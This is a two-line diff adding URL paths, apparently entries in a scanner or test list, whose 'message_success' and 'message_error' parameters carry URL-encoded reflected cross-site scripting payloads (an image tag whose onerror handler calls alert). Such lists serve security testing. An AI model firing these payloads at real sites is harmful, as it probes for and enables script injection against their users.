@@ -1,0 +1,2 @@
+/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
+/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
